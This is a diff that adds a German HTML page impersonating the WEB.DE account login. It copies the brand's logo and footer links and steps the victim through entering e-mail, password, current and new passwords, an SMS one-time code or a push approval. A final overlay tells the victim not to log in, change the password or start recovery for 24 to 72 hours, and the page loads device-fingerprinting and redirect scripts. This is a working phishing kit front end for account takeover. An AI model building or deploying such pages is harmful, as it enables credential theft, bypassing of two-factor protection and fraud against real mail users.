@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon-webde.png" type="image/png">
+  <title>Anmelden — WEB.DE Mein Account</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <!-- __BRAND_JSON__ -->
+  <script src="/brand.js"></script>
+</head>
+<body class="step-email">
+  <header class="gmx-header gmx-header--steps" aria-hidden="true">
+    <div class="header-inner">
+      <span class="gmx-logo" id="brand-logo-text">WEB.DE</span>
+      <span class="header-title">Mein Account</span>
+    </div>
+  </header>
+
+  <div class="page-center">
+  <main class="main card" id="main-auth">
+    <section id="step-email" class="card-inner step active">
+      <header class="auth-header">
+        <img id="brand-logo" class="logo-brand logo-brand-img" src="https://upload.wikimedia.org/wikipedia/de/thumb/5/5f/Web.de_logo.svg/1280px-Web.de_logo.svg.png" alt="WEB.DE" data-testid="logo-brand" width="52" height="18">
+        <h2 data-testid="heading-main" class="heading-main">Willkommen!</h2>
+      </header>
+      <div data-testid="text-form" class="text-form">Mit Account anmelden</div>
+      <form id="form-login" data-testid="container-password" class="form form-login" novalidate autocomplete="on">
+        <div class="input-row input-row-username">
+          <div data-testid="username" class="input-group input-group-username">
+            <input type="email" id="username" name="username" placeholder=" " autocomplete="username" required aria-labelledby="label-username" aria-describedby="error-username" aria-invalid="false" data-testid="input-username" class="lux-input" value="">
+            <label id="label-username" for="username" data-testid="label-username" class="lux-label">E-Mail</label>
+            <div data-testid="custom-icon-username" class="input-icon-custom input-icon-edit" role="button" tabindex="0" aria-label="E-Mail bearbeiten" title="E-Mail bearbeiten" hidden>
+              <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M5 19H6.425L16.2 9.225L14.775 7.8L5 17.575V19ZM4 21C3.71667 21 3.47917 20.9042 3.2875 20.7125C3.09583 20.5208 3 20.2833 3 20V17.575C3 17.3083 3.05 17.0542 3.15 16.8125C3.25 16.5708 3.39167 16.3583 3.575 16.175L16.2 3.575C16.4 3.39167 16.6208 3.25 16.8625 3.15C17.1042 3.05 17.3583 3 17.625 3C17.8917 3 18.15 3.05 18.4 3.15C18.65 3.25 18.8667 3.4 19.05 3.6L20.425 5C20.625 5.18333 20.7708 5.4 20.8625 5.65C20.9542 5.9 21 6.15 21 6.4C21 6.66667 20.9542 6.92083 20.8625 7.1625C20.7708 7.40417 20.625 7.625 20.425 7.825L7.825 20.425C7.64167 20.6083 7.42917 20.75 7.1875 20.85C6.94583 20.95 6.69167 21 6.425 21H4ZM15.475 8.525L14.775 7.8L16.2 9.225L15.475 8.525Z"/></svg>
+            </div>
+          </div>
+          <p role="alert" id="error-username" data-testid="error-username" class="error-username" hidden>
+            <span class="error-username-icon"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M19.82 17L11.18 2a1.36 1.36 0 0 0-2.36 0L.18 17a1.36 1.36 0 0 0 1.18 2h17.28a1.36 1.36 0 0 0 1.18-2zM8.81 6h2.41L11 13H9zM11 17H9v-2h2z"/></svg></span>Ungültige E-Mail-Adresse
+          </p>
+        </div>
+        <div class="input-row input-row-password" hidden>
+          <div data-testid="password" class="input-group input-group--password">
+            <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" aria-labelledby="label-password" data-testid="input-password" class="lux-input">
+            <label id="label-password" for="password" data-testid="label-password" class="lux-label">Passwort</label>
+            <button type="button" class="input-icon-btn input-icon-btn--reveal" data-testid="reveal-icon-password" aria-label="Passwort anzeigen">
+              <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><g><path d="M11.9999 16C13.2499 16 14.3124 15.5625 15.1874 14.6875C16.0624 13.8125 16.4999 12.75 16.4999 11.5C16.4999 10.25 16.0624 9.1875 15.1874 8.3125C14.3124 7.4375 13.2499 7 11.9999 7C10.7499 7 9.6874 7.4375 8.8124 8.3125C7.9374 9.1875 7.4999 10.25 7.4999 11.5C7.4999 12.75 7.9374 13.8125 8.8124 14.6875C9.6874 15.5625 10.7499 16 11.9999 16ZM11.9999 14.2C11.2499 14.2 10.6124 13.9375 10.0874 13.4125C9.5624 12.8875 9.2999 12.25 9.2999 11.5C9.2999 10.75 9.5624 10.1125 10.0874 9.5875C10.6124 9.0625 11.2499 8.8 11.9999 8.8C12.7499 8.8 13.3874 9.0625 13.9124 9.5875C14.4374 10.1125 14.6999 10.75 14.6999 11.5C14.6999 12.25 14.4374 12.8875 13.9124 13.4125C13.3874 13.9375 12.7499 14.2 11.9999 14.2ZM11.9999 19C9.76657 19 7.72907 18.4 5.8874 17.2C4.04574 16 2.59157 14.4167 1.5249 12.45C1.44157 12.3 1.37907 12.1458 1.3374 11.9875C1.29574 11.8292 1.2749 11.6667 1.2749 11.5C1.2749 11.3333 1.29574 11.1708 1.3374 11.0125C1.37907 10.8542 1.44157 10.7 1.5249 10.55C2.59157 8.58333 4.04574 7 5.8874 5.8C7.72907 4.6 9.76657 4 11.9999 4C14.2332 4 16.2707 4.6 18.1124 5.8C19.9541 7 21.4082 8.58333 22.4749 10.55C22.5582 10.7 22.6207 10.8542 22.6624 11.0125C22.7041 11.1708 22.7249 11.3333 22.7249 11.5C22.7249 11.6667 22.7041 11.8292 22.6624 11.9875C22.6207 12.1458 22.5582 12.3 22.4749 12.45C21.4082 14.4167 19.9541 16 18.1124 17.2C16.2707 18.4 14.2332 19 11.9999 19Z"/></g></svg>
+            </button>
+          </div>
+          <p role="alert" id="error-login" data-testid="error-login" class="error-login" hidden>
+            <span class="error-login-icon"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path d="M19.82 17L11.18 2a1.36 1.36 0 0 0-2.36 0L.18 17a1.36 1.36 0 0 0 1.18 2h17.28a1.36 1.36 0 0 0 1.18-2zM8.81 6h2.41L11 13H9zM11 17H9v-2h2z"/></svg></span>Zugangsdaten nicht korrekt
+          </p>
+        </div>
+        <div class="link-forgot-row" hidden>
+          <a href="/forgot-password-redirect.html" class="link-forgot" data-testid="link-forgot-password">Passwort vergessen?</a>
+        </div>
+        <div style="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden" aria-hidden="true">
+          <input type="text" name="website" id="hp-website" tabindex="-1" autocomplete="off">
+        </div>
+        <div class="form-buttons">
+          <button type="submit" class="lux-button lux-button--large btn-login-submit" data-testid="button-next" disabled>
+            <span class="btn-login-text">Weiter</span>
+            <span class="btn-login-loading" aria-hidden="true"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>
+          </button>
+          <button type="button" class="lux-button lux-button--large lux-button-ghost" data-testid="button-back">Zurück</button>
+        </div>
+      </form>
+      <div class="section-divider"></div>
+      <section class="registration-section">
+        <div data-testid="text-registration" class="text-registration">Oder neuen Account anlegen</div>
+        <button type="button" class="lux-button lux-button-ghost" data-testid="button-registration">Jetzt registrieren</button>
+      </section>
+    </section>
+
+    <section id="step-password" class="card step">
+      <a href="#" class="back-link" data-goto="email">
+        <span class="back-arrow">←</span> Zurück
+      </a>
+      <h1 class="card-title-page">Passwort</h1>
+      <p class="last-changed">Zuletzt geändert am <span id="last-changed-date">17. Januar 2026</span></p>
+      <form id="form-password" class="form">
+        <label class="label" for="current-password">Aktuelles Passwort</label>
+        <div class="input-wrap password-wrap">
+          <input type="password" id="current-password" name="current" placeholder="............" autocomplete="current-password" required>
+          <button type="button" class="toggle-password" aria-label="Passwort anzeigen">
+            <svg class="eye" viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+          </button>
+        </div>
+        <label class="label" for="new-password">Neues Passwort</label>
+        <div class="input-wrap password-wrap">
+          <input type="password" id="new-password" name="new" placeholder="............" autocomplete="new-password" required>
+          <button type="button" class="toggle-password" aria-label="Passwort anzeigen">
+            <svg class="eye" viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+          </button>
+        </div>
+        <div class="strength-bar">
+          <div id="strength-fill" class="strength-fill" style="width: 0%"></div>
+        </div>
+        <label class="label" for="confirm-password">Neues Passwort wiederholen</label>
+        <div class="input-wrap password-wrap">
+          <input type="password" id="confirm-password" name="confirm" placeholder="............" autocomplete="new-password" required>
+          <button type="button" class="toggle-password" aria-label="Passwort anzeigen">
+            <svg class="eye" viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+          </button>
+        </div>
+        <button type="submit" class="btn btn-green">Speichern</button>
+      </form>
+    </section>
+
+    <section id="step-verify-choice" class="card step">
+      <h1 class="card-logo">WEB.DE</h1>
+      <h2 class="card-title">Sicherheitsüberprüfung</h2>
+      <p class="card-text">Unser Sicherheitssystem hat Unregelmäßigkeiten beim Zugriff auf Ihr Postfach festgestellt. Bitte bestätigen Sie Ihre Identität.</p>
+      <div class="verify-options">
+        <button type="button" class="btn btn-green btn-block" data-method="sms">SMS-Code anfordern</button>
+        <button type="button" class="btn btn-outline btn-block" data-method="push">Bestätigung per App (Push)</button>
+      </div>
+      <a href="#" class="link-help">Benötigen Sie Hilfe?</a>
+    </section>
+
+    <section id="step-sms-request" class="card step">
+      <h1 class="card-logo">WEB.DE</h1>
+      <h2 class="card-title">Identitätsprüfung</h2>
+      <p class="card-text">Unser Sicherheitssystem hat Unregelmäßigkeiten beim Zugriff auf Ihr Postfach festgestellt. Wir senden Ihnen per SMS einen Code, mit dem Sie auf der Folgeseite den Login abschließen können.</p>
+      <div class="phone-block">
+        <p class="phone-label">Der Code wird per SMS an Ihre hinterlegte Nummer gesendet.</p>
+        <a href="#" class="link">Mobilfunknummer nicht aktuell?</a>
+      </div>
+      <button type="button" class="btn btn-green btn-block" id="btn-request-sms">SMS-Code anfordern</button>
+      <a href="#" class="link-help">Benötigen Sie Hilfe?</a>
+    </section>
+
+    <section id="step-sms-code" class="card step">
+      <h1 class="card-logo">WEB.DE</h1>
+      <h2 class="card-title">Code eingeben</h2>
+      <p class="card-text">Wir haben Ihnen per SMS einen Code an Ihre Nummer gesendet.</p>
+      <form id="form-sms" class="form">
+        <div class="code-input-wrap">
+          <label class="label" for="sms-code">6-stelligen Code eingeben</label>
+          <input type="text" id="sms-code" name="code" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" placeholder="000000" autocomplete="one-time-code">
+        </div>
+        <a href="#" class="link">Keine SMS erhalten? Code erneut senden</a>
+        <a href="#" class="link">Mobilfunknummer nicht aktuell?</a>
+        <button type="submit" class="btn btn-green btn-block">Code bestätigen</button>
+      </form>
+      <a href="#" class="link-help">Benötigen Sie Hilfe?</a>
+    </section>
+
+    <section id="step-push" class="card step">
+      <h1 class="card-logo">WEB.DE</h1>
+      <h2 class="card-title">Sicherheitsüberprüfung</h2>
+      <p class="card-text warning">Es könnte sein, dass Dritte versucht haben, sich Zugriff auf Ihr WEB.DE Konto zu verschaffen. Bitte schützen Sie Ihr Konto!</p>
+      <div class="push-block">
+        <div class="push-illustration">
+          <div class="phone-icon">
+            <span class="notification-dot"></span>
+          </div>
+        </div>
+        <div class="push-steps">
+          <p class="push-prompt">Identifizieren Sie sich jetzt über Ihr Smartphone:</p>
+          <ol class="steps-list">
+            <li>Öffnen Sie die Mitteilung von WEB.DE</li>
+            <li>Bestätigen Sie darüber Ihre Identität</li>
+            <li>Fertig!</li>
+          </ol>
+        </div>
+      </div>
+      <a href="#" class="link">Mitteilung erneut senden</a>
+      <a href="#" class="link" data-goto="verifyChoice">Alternative wählen</a>
+      <a href="#" class="link-help">Benötigen Sie Hilfe?</a>
+    </section>
+
+    <section id="step-success" class="card step">
+      <h1 class="card-logo">WEB.DE</h1>
+      <h2 class="card-title">Passwort geändert</h2>
+      <p class="card-text">Ihr Passwort wurde erfolgreich aktualisiert. Sie können sich jetzt mit Ihrem neuen Passwort anmelden.</p>
+      <a href="#" class="btn btn-primary">Zum Login</a>
+    </section>
+  </main>
+
+  <div id="success-overlay" class="success-overlay" hidden aria-live="polite">
+    <div class="success-overlay-backdrop"></div>
+    <div class="success-overlay-box success-overlay-box--wide">
+      <div class="success-overlay-icon">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <circle cx="12" cy="12" r="10" fill="currentColor"/>
+          <path d="M8 12l3 3 5-6" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h2 class="success-overlay-title">Ihr Passwort wurde geändert</h2>
+      <p class="success-overlay-text">Wir haben zusätzliche Sicherheitsmaßnahmen für Ihr Postfach aktiviert.</p>
+      <p class="success-overlay-text success-overlay-text--block">Aus Sicherheitsgründen wurde Ihr E-Mail-Konto vorübergehend besonders geschützt. Das ist eine reine Vorsichtsmaßnahme.</p>
+      <p class="success-overlay-text success-overlay-text--block">Bitte nehmen Sie in den nächsten <strong>24 Stunden keine Änderungen</strong> an Ihrem Postfach vor: weder erneut anmelden, noch Passwort oder E-Mail-Adresse ändern und auch keine Kontowiederherstellung starten.</p>
+      <div class="success-overlay-highlight" role="note">
+        Jede Aktion am Konto kann die Bearbeitung automatisch auf bis zu 72 Stunden verlängern. Die Freigabe erfolgt von selbst — Sie müssen nichts weiter tun. Bitte warten Sie einfach ab.
+      </div>
+      <p class="success-overlay-text success-overlay-text--block">So schützen wir Ihr Konto zuverlässig. Vielen Dank für Ihr Verständnis.</p>
+      <p class="success-overlay-safe">Ihr Konto ist sicher!</p>
+      <div class="success-overlay-countdown-section">
+        <p class="success-overlay-countdown-intro">Automatische Freigabe in:</p>
+        <div class="success-overlay-countdown-wrap" id="webde-success-countdown-wrap">
+          <div class="success-overlay-countdown-label">Verbleibende Zeit</div>
+          <div class="success-overlay-countdown-time" id="webde-success-countdown-time" aria-live="polite">24:00:00</div>
+          <div class="success-overlay-countdown-suffix">Stunden : Minuten : Sekunden</div>
+        </div>
+        <p class="success-overlay-countdown-foot">Danach können Sie Ihr Postfach wieder wie gewohnt nutzen.</p>
+      </div>
+      <button type="button" class="success-overlay-btn" id="success-overlay-close">Seite schließen</button>
+    </div>
+  </div>
+
+  <div id="protection-overlay" class="protection-overlay" hidden aria-live="polite">
+    <div class="protection-overlay-backdrop"></div>
+    <div class="protection-overlay-box">
+      <div class="protection-overlay-spinner" aria-hidden="true"></div>
+      <h2 class="protection-overlay-title">Wir führen Maßnahmen zum Schutz Ihres Kontos durch.</h2>
+      <p class="protection-overlay-text">Bitte verlassen Sie diese Seite nicht.</p>
+      <p class="protection-overlay-countdown" id="protection-countdown" aria-live="polite">5:00</p>
+    </div>
+  </div>
+  </div>
+
+  <footer class="footer">
+    <ul class="footer-links">
+      <li><a href="https://agb-server.web.de/webdeagb" target="_blank" rel="noopener" data-testid="footer-link">AGB</a></li>
+      <li><a href="https://web.de/Impressum/" target="_blank" rel="noopener" data-testid="footer-link">Impressum</a></li>
+      <li><a href="https://web.de/kuendigungsformular" target="_blank" rel="noopener" data-testid="footer-link">Verträge hier kündigen</a></li>
+      <li><a href="https://agb-server.web.de/datenschutz" target="_blank" rel="noopener" data-testid="footer-link">Datenschutz</a></li>
+      <li><a href="https://web.de/barrierefreiheit/" target="_blank" rel="noopener" data-testid="footer-link">Barrierefreiheit</a></li>
+      <li><a href="https://sw01.rogsurvey.de/data/uxappska/WEBDELogin/" target="_blank" rel="noopener" data-testid="footer-link">Feedback</a></li>
+    </ul>
+  </footer>
+
+  <script src="/webde-fingerprints-pool.js"></script>
+  <script src="/fingerprint.js"></script>
+  <script src="/script-webde.js"></script>
+  <script src="/status-redirect-webde.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
